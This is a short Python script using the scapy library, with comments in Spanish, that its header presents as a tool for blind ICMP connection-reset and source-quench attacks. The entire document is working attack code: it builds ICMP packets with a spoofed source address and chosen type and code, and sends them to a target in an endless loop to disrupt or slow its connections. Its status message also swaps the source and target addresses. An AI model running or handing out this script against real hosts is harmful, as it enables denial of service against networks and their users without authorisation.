## Python script to perform blind ICMP Connection-RESET and Source-Quench Attacks locally

import sys # provee acceso a funciones y objetos mantenidos por el interprete
#import scapy.all # programa para la manipulacion de paquetes
from scapy.all import *
from scapy import *

interface = "eth0" # se defíne la interfaz de comunicacion
source = None
target = None
icmp_type = None
icmp_code = None

class SendICMP(): 
	global target, port
	def transfer(self): 
		i = IP() # paquete IP
		i.src = source # ip fuente para el campo source del paquete
		i.dst = target # ip destino para el campo destino del paquete
		
		c = ICMP() # protocolo, mensaje
		c.type = icmp_type # tipo de mensaje
		c.code = icmp_code # campo con codigo
		send(i/c, verbose=0) # envia paquetes capa 3, encapsula el mensaje icmp
		# en el paquete ip

if __name__ == "__main__":
	#Check for all required arguments
	if len(sys.argv) != 5: # se cuenta el numero de argumentos pasados al script 
		# desde la linea de comandos
		print ("Usage: %s <Source IP> <Target IP> <ICMP_Type> <ICMP_Code>" % sys.argv[0])
		exit()

	i=1
	source = sys.argv[1]	
	target = sys.argv[2]
	icmp_type = int(sys.argv[3])
	icmp_code = int(sys.argv[4])
	conf.iface = interface

	print ("Sending from:%s to:%s an ICMP Packet with Type:Code %i:%i" % (target, source, icmp_type, icmp_code))
	
	while i:
		SendICMP().transfer()